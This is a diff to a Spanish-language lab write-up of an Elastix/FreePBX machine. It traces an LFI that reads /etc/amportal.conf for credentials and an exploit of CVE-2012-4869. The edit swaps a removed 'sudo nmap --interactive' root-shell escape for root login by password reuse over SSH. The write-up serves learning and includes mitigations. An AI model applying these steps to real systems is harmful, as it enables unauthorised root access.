@@ -17,7 +17,7 @@ tags: [linux, elastix, freepbx, lfi, cve, sudo]
 
 ## TL;DR
 
-Centralita Elastix con FreePBX, Webmin y un montón de servicios de correo. Un LFI en `vtigercrm/graph.php` lee `/etc/amportal.conf` y entrega las contraseñas de la base, del panel y de Asterisk. Con una extensión válida se explota CVE-2012-4869 en `callme_page.php` para ejecutar comandos como `asterisk`. La escalada es un `sudo nmap` que se resuelve con el modo interactivo.
+Centralita Elastix con FreePBX, Webmin y un montón de servicios de correo. Un LFI en `vtigercrm/graph.php` lee `/etc/amportal.conf` y entrega las contraseñas de la base, del panel y de Asterisk. Con una extensión válida se explota CVE-2012-4869 en `callme_page.php` para ejecutar comandos como `asterisk`. La escalada es la reutilización de esa contraseña: es también la de `root` por SSH (con algoritmos legacy habilitados en el cliente).
 
 ## Reconocimiento
 
@@ -104,18 +104,22 @@ sudo -l
 
 ```text
 User asterisk may run the following commands on beep:
+    (root) NOPASSWD: /sbin/shutdown
     (root) NOPASSWD: /usr/bin/nmap
     (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
     ...
 ```
 
-`nmap` conserva el modo interactivo en esta versión, que permite lanzar una shell:
+La vía directa, y la que documentan los writeups de referencia, es la contraseña de `amportal.conf` reutilizada en `root`:
 
 ```bash
-sudo nmap --interactive
-nmap> !sh
-# id → uid=0(root)
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oHostKeyAlgorithms=+ssh-dss root@<IP>
+# contraseña: <la de amportal.conf>
 ```
+
+Alternativas del mismo host: Webmin 1.570 en el 10000 y ShellShock contra los CGI antiguos. El `sudo` sobre `nmap`, `yum` o `touch` es una segunda puerta, pero **no** conviene darlo por hecho: el modo `--interactive` de `nmap` desapareció en las versiones modernas; comprobar `nmap --version` antes de contar con él.
 
 ## Evidencia
 
@@ -128,7 +132,7 @@ nmap> !sh
 - Los appliances (Elastix, FreePBX) acumulan paneles y servicios antiguos: `searchsploit` sobre el producto rinde más que buscar CVE por servicio.
 - Un LFI que lee configuración convierte un fallo de lectura en credenciales de varios sistemas.
 - TLS 1.0 obliga a ajustar el cliente; conviene saber hacerlo sin romper el resto del laboratorio.
-- El modo interactivo de `nmap` es root instantáneo cuando está en sudoers (GTFOBins).
+- La contraseña del panel reutilizada en `root` es la escalada corta; el `sudo` sobre `nmap`/`yum` es una segunda puerta, pero el modo interactivo ya no existe en las versiones recientes.
 - Las extensiones del panel son datos de entrada del exploit: hay que enumerarlas antes de disparar.
 
 ## Mitigaciones y detección
